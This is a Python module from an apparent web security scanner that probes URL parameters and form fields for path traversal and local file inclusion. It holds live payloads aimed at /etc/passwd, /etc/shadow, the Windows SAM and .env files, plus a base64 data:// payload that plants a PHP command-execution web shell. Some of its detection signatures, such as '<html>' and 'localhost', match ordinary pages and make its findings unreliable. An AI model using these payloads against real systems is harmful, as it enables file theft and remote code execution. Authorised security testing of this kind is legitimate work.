"""
Path Traversal (Directory Traversal) vulnerability detection.

Detects path traversal vulnerabilities that allow attackers to access
files outside the web root directory.
"""

from __future__ import annotations

import asyncio
import logging
from urllib.parse import parse_qs, urljoin, urlparse

from ciberwebscan.export.models import (
    ConfidenceLevel,
    Severity,
    VulnerabilityFinding,
)

from .base import AttackContext, AttackEngine, AttackIntensity
from .payloads import PayloadLoader

logger = logging.getLogger(__name__)


class PathTraversalAttacker(AttackEngine):
    """Path Traversal vulnerability detection engine."""

    def __init__(self):
        super().__init__("traversal")
        self.payload_loader = PayloadLoader()

        # Signatures of successful path traversal attacks
        self.success_signatures = [
            # Linux/Unix files
            b"root:x:",
            b"daemon:x:",
            b"/bin/bash",
            b"/bin/sh",  # /etc/passwd
            b"127.0.0.1",
            b"localhost",
            b"::1",  # /etc/hosts
            # Windows files
            b"[boot loader]",
            b"boot.ini",
            b"[operating systems]",  # boot.ini
            b"# Copyright",
            b"microsoft",
            b"windows",  # hosts file
            b"[version]",
            b'Signature="$Windows NT$',  # Windows system files
            # Web application files
            b"<?php",
            b"<html>",
            b"<HTML>",
            b"<title>",
            b"<TITLE>",
            b"mysql_connect",
            b"include(",
            b"require(",
            # Apache/Nginx files
            b"ServerRoot",
            b"DocumentRoot",
            b"LoadModule",
            b"server {",
            b"location /",
            b"root /var/www",
        ]

        # Common sensitive files to target
        self.target_files = [
            "/etc/passwd",
            "/etc/hosts",
            "/etc/shadow",
            "/etc/group",
            "/proc/version",
            "/proc/cpuinfo",
            "/proc/meminfo",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "C:\\boot.ini",
            "C:\\windows\\win.ini",
            "C:\\windows\\system.ini",
            "C:\\windows\\repair\\sam",
            "/var/log/apache2/access.log",
            "/var/log/apache/access.log",
            "/var/log/nginx/access.log",
            "/var/log/httpd/access_log",
            "../../../wp-config.php",
            "../../../config.php",
            "../../../database.php",
            "../../../.env",
        ]

    def get_payloads(self, intensity: AttackIntensity, max_count: int) -> list[str]:
        """Get path traversal payloads based on intensity level."""
        return self.payload_loader.get_payloads("traversal", intensity, max_count)

    async def execute(self, context: AttackContext) -> list[VulnerabilityFinding]:
        """Execute path traversal attack simulation."""
        self.logger.info(
            f"Starting path traversal testing on {context.config.target_url}"
        )

        vulnerabilities = []

        # Get target response to analyze
        response = await self.send_request(context, context.config.target_url)
        if not response:
            self.logger.warning("Could not fetch target URL")
            return vulnerabilities

        # Test path traversal in URL parameters
        param_vulns = await self._test_url_parameters(context, response)
        vulnerabilities.extend(param_vulns)

        # Test path traversal in forms
        form_vulns = await self._test_form_traversal(context, response)
        vulnerabilities.extend(form_vulns)

        # Test common file inclusion patterns
        include_vulns = await self._test_file_inclusion(context, response)
        vulnerabilities.extend(include_vulns)

        self.logger.info(
            f"Path traversal testing completed. Found {len(vulnerabilities)} vulnerabilities"
        )
        return vulnerabilities

    async def _test_url_parameters(
        self, context: AttackContext, response
    ) -> list[VulnerabilityFinding]:
        """Test URL parameters for path traversal."""
        vulnerabilities = []
        parsed_url = urlparse(response.url)

        if not parsed_url.query:
            return vulnerabilities

        query_params = parse_qs(parsed_url.query)
        base_payloads = self.get_payloads(
            context.config.intensity, context.config.max_payloads
        )

        for param_name, _param_values in query_params.items():
            if not self.should_test_parameter(
                param_name
            ) or not self._is_file_parameter(param_name):
                continue

            # Test direct file access
            for target_file in self.target_files[:5]:
                for base_payload in base_payloads[:3]:  # Limit combinations
                    payload = base_payload + target_file

                    vuln = await self._test_parameter_traversal(
                        context, response.url, param_name, payload, "GET"
                    )
                    if vuln:
                        vulnerabilities.append(vuln)

                    # Rate limiting
                    if context.config.delay_between_requests > 0:
                        await asyncio.sleep(context.config.delay_between_requests)

        return vulnerabilities

    async def _test_form_traversal(
        self, context: AttackContext, response
    ) -> list[VulnerabilityFinding]:
        """Test form inputs for path traversal."""
        vulnerabilities = []

        forms = self.extract_forms(response.text)
        base_payloads = self.get_payloads(
            context.config.intensity, min(context.config.max_payloads, 3)
        )

        for form in forms:
            if not form["inputs"]:
                continue

            base_url = str(response.url)
            action_url = (
                urljoin(base_url, form["action"]) if form["action"] else base_url
            )

            for input_field in form["inputs"]:
                if input_field["type"].lower() in ["hidden", "submit", "button"]:
                    continue

                field_name = input_field["name"]
                if (
                    not field_name
                    or not self.should_test_parameter(field_name)
                    or not self._is_file_parameter(field_name)
                ):
                    continue

                # Test file inclusion
                for target_file in self.target_files[:3]:
                    for base_payload in base_payloads[:2]:
                        payload = base_payload + target_file

                        vuln = await self._test_parameter_traversal(
                            context, action_url, field_name, payload, form["method"]
                        )
                        if vuln:
                            vulnerabilities.append(vuln)

                        # Rate limiting
                        if context.config.delay_between_requests > 0:
                            await asyncio.sleep(context.config.delay_between_requests)

        return vulnerabilities

    async def _test_file_inclusion(
        self, context: AttackContext, response
    ) -> list[VulnerabilityFinding]:
        """Test for Local File Inclusion (LFI) patterns."""
        vulnerabilities = []

        # Look for potential file inclusion parameters in the current URL
        parsed_url = urlparse(response.url)
        if not parsed_url.query:
            return vulnerabilities

        query_params = parse_qs(parsed_url.query)

        # Look for parameters that might be used for file inclusion
        file_params = [
            param for param in query_params if self._is_file_parameter(param)
        ]

        if not file_params:
            return vulnerabilities

        # Test known LFI payloads
        lfi_payloads = [
            "/etc/passwd%00",
            "../../../../etc/passwd%00",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts%00",
            "php://filter/read=convert.base64-encode/resource=/etc/passwd",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4K",
        ]

        for param_name in file_params[:2]:  # Limit parameters
            for payload in lfi_payloads:
                vuln = await self._test_parameter_traversal(
                    context, response.url, param_name, payload, "GET"
                )
                if vuln:
                    vulnerabilities.append(vuln)

                # Rate limiting
                if context.config.delay_between_requests > 0:
                    await asyncio.sleep(context.config.delay_between_requests)

        return vulnerabilities

    async def _test_parameter_traversal(
        self,
        context: AttackContext,
        url: str,
        param_name: str,
        payload: str,
        method: str,
    ) -> VulnerabilityFinding | None:
        """Test a specific parameter for path traversal vulnerability."""
        try:
            if method.upper() == "GET":
                test_response = await self.send_request(
                    context, url, "GET", params={param_name: payload}
                )
            else:
                test_response = await self.send_request(
                    context, url, "POST", data={param_name: payload}
                )

            if not test_response:
                return None

            # Check response for success indicators
            confidence, evidence = self._analyze_traversal_response(
                test_response.content, test_response.text, payload
            )

            if confidence != ConfidenceLevel.LOW or evidence:
                attack_payload = self.create_payload_object(payload, param_name, method)

                return self.create_vulnerability(
                    title=f"Path Traversal vulnerability in parameter '{param_name}'",
                    description=f"Parameter '{param_name}' appears vulnerable to path traversal attacks, allowing access to files outside the web root.",
                    severity=self._get_traversal_severity(confidence),
                    confidence=confidence,
                    url=str(test_response.url),
                    payload=attack_payload,
                    evidence=evidence,
                    remediation="Implement proper input validation. Use whitelisting for allowed file paths. Avoid direct file system access based on user input.",
                    cwe_id="CWE-22",
                    owasp_category="A01:2021 - Broken Access Control",
                )

        except Exception as e:
            self.logger.debug(
                f"Error testing path traversal in parameter {param_name}: {e}"
            )

        return None

    def _analyze_traversal_response(
        self, content: bytes, text: str, payload: str
    ) -> tuple[ConfidenceLevel, str]:
        """Analyze response for path traversal success indicators."""
        evidence_parts = []

        # Check for file content signatures (high confidence)
        for signature in self.success_signatures:
            if signature in content:
                evidence_parts.append(
                    f"File content detected: {signature.decode('utf-8', errors='ignore')[:50]}"
                )
                return ConfidenceLevel.HIGH, "; ".join(evidence_parts)

        # Check for error messages that indicate file system access
        error_patterns = [
            "no such file or directory",
            "permission denied",
            "file not found",
            "access denied",
            "invalid path",
            "include_path",
            "fopen",
            "file_get_contents",
        ]

        text_lower = text.lower()
        for error_pattern in error_patterns:
            if error_pattern in text_lower:
                evidence_parts.append(f"File system error: {error_pattern}")

        # Check for path indicators in error messages
        if any(
            indicator in text_lower
            for indicator in ["/etc/", "/var/", "/usr/", "c:\\", "windows\\"]
        ):
            evidence_parts.append("File system paths detected in response")

        if evidence_parts:
            return ConfidenceLevel.MEDIUM, "; ".join(evidence_parts)

        return ConfidenceLevel.LOW, ""

    def _is_file_parameter(self, param_name: str) -> bool:
        """Check if parameter name suggests it's used for file operations."""
        param_lower = param_name.lower()
        file_indicators = [
            "file",
            "filename",
            "path",
            "include",
            "require",
            "page",
            "template",
            "view",
            "load",
            "read",
            "document",
            "resource",
            "src",
            "url",
            "uri",
            "link",
            "href",
            "img",
            "image",
        ]

        return any(indicator in param_lower for indicator in file_indicators)

    def _get_traversal_severity(self, confidence: ConfidenceLevel) -> Severity:
        """Determine path traversal severity based on confidence level."""
        if confidence == ConfidenceLevel.HIGH:
            return Severity.CRITICAL  # File access is critical
        elif confidence == ConfidenceLevel.MEDIUM:
            return Severity.HIGH
        else:
            return Severity.MEDIUM
